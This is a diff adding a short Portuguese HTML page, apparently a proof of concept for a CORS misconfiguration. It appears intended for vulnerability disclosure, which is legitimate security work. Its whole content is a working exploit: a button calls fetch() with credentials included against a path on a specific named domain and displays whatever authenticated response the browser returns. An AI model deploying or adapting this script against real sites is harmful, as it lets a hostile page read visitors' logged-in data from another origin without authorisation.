@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8">
+    <title>CORS PoC</title>
+  </head>
+  <body>
+    <h2>Prova de Conceito – CORS Misconfiguration</h2>
+    <p>Esta página está sendo servida via GitHub Pages.</p>
+
+    <button onclick="exploit()">Executar PoC</button>
+
+    <pre id="result" style="white-space: pre-wrap; margin-top: 20px;"></pre>
+
+    <script>
+      function exploit() {
+        fetch("https://sparkpay.heroi.dev/cdn-cgi/rum?", {
+          method: "GET",
+          credentials: "include"
+        })
+        .then(response => response.text())
+        .then(data => {
+          document.getElementById("result").innerText =
+            "Resposta obtida da aplicação alvo:\n\n" + data;
+        })
+        .catch(error => {
+          document.getElementById("result").innerText =
+            "Erro ao executar a PoC:\n" + error;
+        });
+      }
+    </script>
+  </body>
+</html>
